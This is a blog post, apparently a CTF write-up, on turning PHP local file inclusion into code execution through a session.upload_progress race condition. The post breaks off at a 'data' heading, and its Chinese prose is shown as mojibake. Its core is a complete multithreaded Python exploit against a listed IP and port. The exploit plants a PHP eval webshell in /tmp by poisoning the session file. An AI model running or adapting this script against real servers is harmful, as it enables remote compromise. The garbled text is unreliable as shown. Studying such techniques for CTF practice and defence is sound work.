<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icon.jpg?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icon.jpg?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="ç¬¨æ¯”       http:&#x2F;&#x2F;81.70.102.209:10040&#x2F;index.php  1234&lt;?php    show_source(&amp;#x27;.&#x2F;index.php&amp;#x27;);    include $_GET[&amp;#x27;file&amp;#x27;];?&gt;  åšé¢˜æ—¶ï¼Œè¯•äº†å„ç§ä¼ªåè®®ï¼Œæœ€åå¾—å‡ºçš„ç»“è®ºæ˜¯ï¼Œallow_url_includ">
<meta property="og:type" content="article">
<meta property="og:title" content="LFI_to_RCE">
<meta property="og:url" content="http://example.com/2021/11/16/LFI-to-RCE/index.html">
<meta property="og:site_name" content="Biscuit19_">
<meta property="og:description" content="ç¬¨æ¯”       http:&#x2F;&#x2F;81.70.102.209:10040&#x2F;index.php  1234&lt;?php    show_source(&amp;#x27;.&#x2F;index.php&amp;#x27;);    include $_GET[&amp;#x27;file&amp;#x27;];?&gt;  åšé¢˜æ—¶ï¼Œè¯•äº†å„ç§ä¼ªåè®®ï¼Œæœ€åå¾—å‡ºçš„ç»“è®ºæ˜¯ï¼Œallow_url_includ">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160105326.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108214.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108216.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108217.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108218.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108219.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108220.png">
<meta property="og:image" content="https://storage.tttang.com/media/attachment/2021/11/01/661223a3-6bfb-4ef2-ad14-0a6bc53128fa.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108221.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108222.png">
<meta property="article:published_time" content="2021-11-15T17:07:29.000Z">
<meta property="article:modified_time" content="2021-11-15T17:11:52.871Z">
<meta property="article:author" content="Biscuit19_">
<meta property="article:tag" content="æ–‡ä»¶åŒ…å«">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160105326.png"><title>LFI_to_RCE | Biscuit19_</title><link ref="canonical" href="http://example.com/2021/11/16/LFI-to-RCE/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"100px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copiar","copySuccess":"Ã‰xito en copia","copyError":"Error en copia"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Inicio</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archivos</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">CategorÃ­as</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Etiquetas</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Biscuit19_</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">LFI_to_RCE</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Creado</span><span class="post-meta-item__value">2021-11-16</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Actualizado</span><span class="post-meta-item__value">2021-11-16</span></span></div></header><div class="post-body">
        <h1 id="ç¬¨æ¯”"   >
          <a href="#ç¬¨æ¯”" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç¬¨æ¯”" class="headerlink" title="ç¬¨æ¯”"></a>ç¬¨æ¯”</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://81.70.102.209:10040/index.php" >http://81.70.102.209:10040/index.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160105326.png" alt="image-20211116010445092"></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="string">&#x27;./index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>åšé¢˜æ—¶ï¼Œè¯•äº†å„ç§ä¼ªåè®®ï¼Œæœ€åå¾—å‡ºçš„ç»“è®ºæ˜¯ï¼Œallow_url_include=offï¼Œæ‰€ä»¥å¾ˆå¤šå†™å…¥çš„å‘½ä»¤æˆ‘ä»¬å°±æ— æ³•æ‰§è¡Œï¼Œæˆ‘ä»¬åªèƒ½æŸ¥çœ‹æ–‡ä»¶ï¼ŒåˆæŸ¥çœ‹äº†ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼Œå‘ç°ä¸€äº›æ–‡ä»¶åˆæ²¡æœ‰æŸ¥çœ‹æƒé™ï¼Œåˆæ‹¿å­—å…¸æ‰«äº†ä¸€ä¼šå„¿ï¼Œä¹Ÿæ²¡å•¥æ”¶è·ã€‚</p>
<p>èµ›åæ ¹æ®å‡ºé¢˜äººæç¤ºï¼Œå»çœ‹äº†pç¥çš„ä¸€ç¯‡åšå®¢<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://tttang.com/archive/1312/#toc_0x01%E5%AD%A6%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AAsession%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E6%96%B9%E6%B3%95%E3%80%82" >https://tttang.com/archive/1312/#toc_0x01å­¦åˆ°äº†ä¸€ä¸ªsessionä¸´æ—¶æ–‡ä»¶åŒ…å«çš„æ–¹æ³•ã€‚</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="åŸç†1"   >
          <a href="#åŸç†1" class="heading-link"><i class="fas fa-link"></i></a><a href="#åŸç†1" class="headerlink" title="åŸç†1"></a>åŸç†1</h1>
      
        <h2 id="1-ä¸´æ—¶æ–‡ä»¶åŒ…å«"   >
          <a href="#1-ä¸´æ—¶æ–‡ä»¶åŒ…å«" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¸´æ—¶æ–‡ä»¶åŒ…å«" class="headerlink" title="1.ä¸´æ—¶æ–‡ä»¶åŒ…å«"></a>1.ä¸´æ—¶æ–‡ä»¶åŒ…å«</h2>
      <p>æˆ‘ä»¬å¯¹ä»»æ„ä¸€ä¸ªPHPæ–‡ä»¶å‘é€ä¸€ä¸ªä¸Šä¼ çš„æ•°æ®åŒ…æ—¶ï¼Œ<strong>ä¸ç®¡è¿™ä¸ªPHPæœåŠ¡åç«¯æ˜¯å¦æœ‰å¤„ç†<code>$_FILES</code>çš„é€»è¾‘ï¼ŒPHPéƒ½ä¼šå°†ç”¨æˆ·ä¸Šä¼ çš„æ•°æ®å…ˆä¿å­˜åˆ°ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ä¸­</strong>ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸€èˆ¬ä½äºç³»ç»Ÿä¸´æ—¶ç›®å½•ï¼Œæ–‡ä»¶åæ˜¯phpå¼€å¤´ï¼Œåé¢è·Ÿ6ä¸ªéšæœºå­—ç¬¦ï¼›åœ¨æ•´ä¸ªPHPæ–‡ä»¶æ‰§è¡Œå®Œæ¯•åï¼Œè¿™äº›ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«æ¸…ç†æ‰ã€‚</p>
<p>åœ¨æœ¬é¢˜ä¸­ï¼Œæˆ‘ä»¬æ— ä»çŸ¥æ™“åå…­ä½çš„éšæœºå­—ç¬¦ï¼Œè¡Œä¸å¤ªé€šã€‚</p>

        <h2 id="2-session-upload-progressä¸Sessionæ–‡ä»¶åŒ…å«"   >
          <a href="#2-session-upload-progressä¸Sessionæ–‡ä»¶åŒ…å«" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-session-upload-progressä¸Sessionæ–‡ä»¶åŒ…å«" class="headerlink" title="2.session.upload_progressä¸Sessionæ–‡ä»¶åŒ…å«"></a>2.session.upload_progressä¸Sessionæ–‡ä»¶åŒ…å«</h2>
      
        <h3 id="1-session-upload-progress"   >
          <a href="#1-session-upload-progress" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-session-upload-progress" class="headerlink" title="1.session.upload_progress"></a>1.session.upload_progress</h3>
      <p>å½“ session.upload_progress.enabled INI é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚ è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€ã€‚å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨$_SESSIONä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯session.upload_progress.prefixä¸ session.upload_progress.nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼</p>
<p>php.iniæ–‡ä»¶ä¸­çš„session.upload_progressæ”¯æŒï¼š</p>
<figure class="highlight ini"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">On</span> </span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">On</span> é»˜è®¤<span class="literal">on</span></span><br><span class="line"></span><br><span class="line"><span class="attr">session.upload_progress.prefix</span> = <span class="string">&quot;upload_progress_&quot;</span> </span><br><span class="line">ï¼ˆsessionæ–‡ä»¶é‡Œupload_progressçš„å‰ç¼€ï¼‰</span><br><span class="line"><span class="attr">session.upload_progress.name</span> = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>ï¼ˆpostå‘çš„è¯·æ±‚ä¸­éœ€è¦çš„å‚æ•°åï¼Œæœ€åä¼šä½œä¸ºsessionæ–‡ä»¶é‡Œupload_progressçš„åå­—ï¼‰</span><br></pre></td></tr></table></div></figure>

<p>sessionæ–‡ä»¶ä¸­çš„ç¤ºä¾‹ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_POSTNAME|a:5:&#123;s:10:&quot;start_time&quot;;i:1636908253;s:14:&quot;content_length&quot;;i:41312;s:15:&quot;bytes_processed&quot;;i:5301;s:4:&quot;done&quot;.....</span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­ï¼ŒPOSTNAMEå°±æ˜¯POPSTä¼ è¿‡å»çš„å‚æ•°å€¼ã€‚</p>

        <h3 id="2-åˆ©ç”¨åŸç†ä¸æ¡ä»¶"   >
          <a href="#2-åˆ©ç”¨åŸç†ä¸æ¡ä»¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åˆ©ç”¨åŸç†ä¸æ¡ä»¶" class="headerlink" title="2.åˆ©ç”¨åŸç†ä¸æ¡ä»¶"></a>2.åˆ©ç”¨åŸç†ä¸æ¡ä»¶</h3>
      <p>PHPåœ¨å¼€å¯äº†<code>session.upload_progress.enable</code>åï¼ˆåœ¨åŒ…æ‹¬Dockerçš„å¤§éƒ¨åˆ†ç¯å¢ƒä¸‹é»˜è®¤æ˜¯å¼€å¯çš„ï¼‰ï¼Œå°†ä¼šæŠŠç”¨æˆ·<strong>ä¸Šä¼ æ–‡ä»¶çš„ä¿¡æ¯</strong>ä¿å­˜åœ¨Sessionä¸­ï¼Œ<strong>è€ŒPHPçš„Sessioné»˜è®¤æ˜¯ä¿å­˜åœ¨æ–‡ä»¶é‡Œçš„</strong>ã€‚</p>
<p>PHPä¸­å¯ä»¥é€šè¿‡session progressåŠŸèƒ½å®ç°ä¸´æ—¶æ–‡ä»¶çš„å†™å…¥ã€‚è¿™ç§åˆ©ç”¨æ–¹å¼éœ€è¦æ»¡è¶³ä¸‹é¢å‡ ä¸ªæ¡ä»¶ï¼š</p>
<ul>
<li>ç›®æ ‡ç¯å¢ƒå¼€å¯äº†<code>session.upload_progress.enable</code>é€‰é¡¹</li>
<li>å‘é€ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ–‡ä»¶è¡¨å•å’Œä¸€ä¸ªåå­—æ˜¯<code>PHP_SESSION_UPLOAD_PROGRESS</code>çš„å­—æ®µ</li>
<li>è¯·æ±‚çš„Cookieä¸­åŒ…å«Session IDï¼ˆå¯ç”¨äº†sessionï¼‰</li>
</ul>
<p>è¿™ä¸ªæ–¹æ³•çš„åŸç†æ˜¯ï¼ŒPHPåœ¨å¼€å¯äº†<code>session.upload_progress.enable</code>åï¼ˆåœ¨åŒ…æ‹¬Dockerçš„å¤§éƒ¨åˆ†ç¯å¢ƒä¸‹é»˜è®¤æ˜¯å¼€å¯çš„ï¼‰ï¼Œå°†ä¼šæŠŠç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„ä¿¡æ¯ä¿å­˜åœ¨Sessionä¸­ï¼Œè€ŒPHPçš„Sessioné»˜è®¤æ˜¯ä¿å­˜åœ¨æ–‡ä»¶é‡Œçš„ã€‚</p>
<p>æ‰€ä»¥å½“æ”»å‡»è€…å‘é€æ»¡è¶³ä¸Šè¿°æ¡ä»¶çš„æ•°æ®åŒ…æ—¶ï¼Œå°±ç­‰äºèƒ½å¤Ÿæ§åˆ¶<strong>Sessionæ–‡ä»¶å†…å®¹ã€‚</strong></p>
<p><strong>ä½†æ˜¯PHPä¸­è¿˜æœ‰å¦å¤–ä¸€ä¸ªé…ç½®é¡¹<code>session.upload_progress.cleanup</code>ï¼Œé»˜è®¤å¼€å¯ã€‚</strong>åœ¨è¿™ä¸ªé€‰é¡¹å¼€å¯æ—¶ï¼ŒPHPä¼šåœ¨<strong>ä¸Šä¼ è¯·æ±‚è¢«è¯»å–å®Œæˆåè‡ªåŠ¨æ¸…ç†æ‰è¿™ä¸ªSession</strong>ï¼Œ<strong>æ³¨æ„ï¼šè¿™é‡Œsessionæ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤ï¼Œä½†æ˜¯å†…å®¹ä¼šè¢«æ¸…ç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯è¦åœ¨æ¡ä»¶ç«äº‰ä¸­åŒ…å«è¿™ä¸ªsession</strong></p>
<p>â€‹    æ‰€ä»¥ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦åœ¨Sessionæ–‡ä»¶è¢«æ¸…ç†å‰åˆ©ç”¨å®ƒï¼Œè¿™ä¹Ÿä¼šç”¨åˆ°æ¡ä»¶ç«äº‰ï¼ˆRace Conditionï¼‰ï¼Œä¹Ÿå°±æ˜¯éœ€è¦å¤šçº¿ç¨‹æ¥å¹¶å‘æ‰§è¡Œï¼ŒåŠ›æ±‚åœ¨/tmp/sess_PHPSESSIDè¢«æ¸…é™¤ä¹‹å‰ï¼Œå°±èƒ½æ‰§è¡Œæ–‡ä»¶åŒ…å«ï¼Œæ‰§è¡Œæˆ‘ä»¬çš„æœ¨é©¬phpå‘½ä»¤ã€‚</p>

        <h1 id="å®ç°1"   >
          <a href="#å®ç°1" class="heading-link"><i class="fas fa-link"></i></a><a href="#å®ç°1" class="headerlink" title="å®ç°1"></a>å®ç°1</h1>
      <p>ç›´æ¥è´´åšå®¢ä¸­å†™å¥½çš„ä»£ç ï¼Œæˆ‘å¯¹å…¶ç†è§£å†™åœ¨æ³¨é‡Šä¸­</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://81.70.102.209:10040/index.php&#x27;</span></span><br><span class="line">session = requests.session()</span><br><span class="line">flag = <span class="string">&#x27;shellsuccess&#x27;</span><span class="comment">#åˆ¤æ–­æ ‡è¯†/sessionID</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>(<span class="params">e: threading.Event</span>):</span><span class="comment">#å¤šçº¿ç¨‹ï¼Œuploadå‘æ–‡ä»¶</span></span><br><span class="line">   files = [</span><br><span class="line">      (<span class="string">&#x27;file&#x27;</span>, (<span class="string">&#x27;load.png&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">40960</span>, <span class="string">&#x27;image/png&#x27;</span>)),<span class="comment">#åˆ¶ä½œäº†ä¸€å¼ å›¾ç‰‡æ–‡ä»¶</span></span><br><span class="line">   ]</span><br><span class="line">   <span class="comment">#PHP_SESSION_UPLOAD_PROGRESSå­—æ®µ</span></span><br><span class="line">   data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">rf&#x27;&#x27;&#x27;&lt;?php file_put_contents(&#x27;/tmp/success2&#x27;, &#x27;&lt;?php @eval($_POST[&quot;duo&quot;]);?&gt;&#x27;); echo(&#x27;<span class="subst">&#123;flag&#125;</span>&#x27;); ?&gt;&#x27;&#x27;&#x27;</span>&#125;</span><br><span class="line">   <span class="comment">#è¿™å¥è¯çš„æ„æ€æ˜¯åœ¨PHP_SESSION_UPLOAD_PROGRESSä¸­å†™è¿›äº†ä¸€æ®µphpä»£ç ï¼Œè¿™æ®µä»£ç æœ€åä¼šå­˜åˆ°/tmp/sess_PHPSESSIDä¸­</span></span><br><span class="line">   <span class="comment">#è¿™æ®µphpä»£ç æŠŠæœ¨é©¬å†™è¿›å¹¶åˆ›é€ äº†/tmp/successè¿™ä¸ªæ–‡ä»¶é‡Œï¼Œç„¶ååˆåœ¨æœ¬ä»£ç ä¸­è¾“å‡ºäº†flag</span></span><br><span class="line">   <span class="comment">#ä¸ºä»€ä¹ˆä»£ç ä¼šè¢«æ‰§è¡Œï¼Œå› ä¸ºincludeä¼šæŠŠæ–‡ä»¶å†…å®¹æŒ‰phpè§£æå¹¶æ‰§è¡Œï¼Œ</span></span><br><span class="line">   <span class="comment"># å°½ç®¡/tmp/sess_PHPSESSIDé‡Œè¿˜æœ‰å¾ˆå¤šåˆ«çš„ä¿¡æ¯ï¼Œå®ƒä»¬æ— æ³•è¢«phpè§£æ</span></span><br><span class="line">   <span class="comment">#ä½†&lt;?php ?&gt;å†…çš„å†…å®¹ï¼Œä»ä¼šè¢«æ­£å¸¸è§£æï¼Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å†™å…¥äº†phpæœ¨é©¬ã€‚</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> <span class="keyword">not</span> e.is_set():<span class="comment">#eæ²¡è¢«setï¼Œä¸€ç›´æ‰§è¡Œ</span></span><br><span class="line">      requests.post(<span class="comment">#å‘åŒ…ï¼Œ</span></span><br><span class="line">         target,</span><br><span class="line">         data=data,</span><br><span class="line">         files=files,<span class="comment">#å‘æ–‡ä»¶</span></span><br><span class="line">         cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: flag&#125;,<span class="comment">#è¿™æ˜¯éšä¾¿å†™äº†ä¸ªPHPSESSIDï¼Œè¿™ä¸ªä¼šè¢«æ”¾åœ¨/tmp/sess_PHPSESSIDé‡Œ</span></span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">e: threading.Event</span>):</span><span class="comment">#å¤šçº¿ç¨‹ï¼Œåˆ¤æ–­æ˜¯å¦ç¨‹åº</span></span><br><span class="line">   <span class="keyword">while</span> <span class="keyword">not</span> e.is_set():</span><br><span class="line">      response = requests.get(</span><br><span class="line">         <span class="string">f&#x27;<span class="subst">&#123;target&#125;</span>?file=/tmp/sess_<span class="subst">&#123;flag&#125;</span>&#x27;</span>,</span><br><span class="line">         <span class="comment">#ç»™æ–‡ä»¶åŒ…å«ç½‘ç«™å‘è¯·æ±‚ï¼Œä½¿å…¶åŒ…å«/tmp/sess_PHPSESSIDè¿™ä¸ªæ–‡ä»¶</span></span><br><span class="line">         <span class="comment">#è€Œè¿™ä¸ªæ–‡ä»¶é‡Œæœ‰echo(&#x27;&#123;flag&#125;&#x27;);è¿™å¥è¯ï¼Œå¦‚æœåŒ…å«æˆåŠŸï¼Œåˆ™é¡µé¢ä¸Šä¼šæœ‰&#123;flag&#125;å­—ç¬¦å›æ˜¾</span></span><br><span class="line">      )</span><br><span class="line">      <span class="built_in">print</span>(response.content)</span><br><span class="line">      <span class="keyword">if</span> flag.encode() <span class="keyword">in</span> response.content:<span class="comment">#å¦‚æœ&#123;flag&#125;å­—ç¬¦å›æ˜¾ï¼Œè¯´æ˜æ–‡ä»¶åŒ…å«æˆåŠŸï¼Œä¹Ÿè¯´æ˜æ–‡ä»¶æ‰§è¡ŒæˆåŠŸäº†ï¼Œæœ¨é©¬å·²ç»å†™å…¥äº†/tmp/success</span></span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;æœ¨é©¬å†™å…¥æˆåŠŸ&quot;</span>)</span><br><span class="line">         e.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   futures = []</span><br><span class="line">   event = threading.Event()</span><br><span class="line">   pool = ThreadPoolExecutor(<span class="number">15</span>)<span class="comment">#è¿›ç¨‹æ± ï¼Œ15ä¸ªè¿›ç¨‹</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">      futures.append(pool.submit(upload, event))</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">      futures.append(pool.submit(write, event))</span><br><span class="line"></span><br><span class="line">   wait(futures)<span class="comment">#åº”è¯¥æ˜¯æ‰§è¡Œè¿›ç¨‹</span></span><br></pre></td></tr></table></div></figure>

<p>è§£æå…¶ä¸­æ¯”è¾ƒé‡è¦çš„ä»£ç </p>

        <h2 id="cookies-â€˜PHPSESSIDâ€™-flag"   >
          <a href="#cookies-â€˜PHPSESSIDâ€™-flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#cookies-â€˜PHPSESSIDâ€™-flag" class="headerlink" title="cookies={â€˜PHPSESSIDâ€™: flag},"></a>cookies={â€˜PHPSESSIDâ€™: flag},</h2>
      <p>è¿™å¥è¯æ˜¯è‡ªå·±æ„é€ äº†ä¸€ä¸ªPHPSESSIDï¼Œè¿™æ ·å½“sessionäº§ç”Ÿä¸´æ—¶sessionæ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬å°±çŸ¥é“å®ƒçš„å§“åäº†ï¼Œ**/tmp/sess_PHPSESSIDæ–‡ä»¶**</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108214.png" alt="image-20211115111854684"></p>
<p>è¿™ä¸ªtmpæ˜¯ç³»ç»Ÿæ ¹ç›®å½•,ä¸æ˜¯ç½‘ç«™æ ¹ç›®å½•</p>
<p>åŒæ ·çš„ï¼Œè¿™éœ€è¦<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.use-strict-mode" >session.use_strict_mode</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>=Offï¼šäº§ç”Ÿä¼šè¯ID</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108216.png" alt="image-20211115015332481"></p>

        <h2 id="data"   >
          <a href="#data" class="heading-link"><i class="fas fa-link"></i></a><a href="#data" class="headerlink" title="data"></a>data</h2>
